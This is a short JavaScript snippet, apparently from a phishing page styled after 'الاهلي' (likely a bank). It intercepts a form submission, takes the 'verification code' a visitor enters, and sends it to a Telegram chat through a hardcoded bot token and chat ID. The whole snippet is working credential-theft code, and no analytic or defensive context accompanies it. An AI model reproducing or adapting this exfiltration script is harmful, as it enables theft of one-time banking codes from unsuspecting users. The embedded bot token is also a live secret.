const form = document.querySelector ("#form");

form .addEventListener("submit" , (e) =>{
e.preventDefault();

var vir = document.getElementById("vir").value;


var my_text = `الاهلي%0A   - 'كود التحقق': ${vir}  %0A `

var token ="5596027783:AAEERyqvvf5_709PqNaU8VfHTlcFIl2BiYg";
var chat_id =-1001693270224;
var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}|`

let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")
})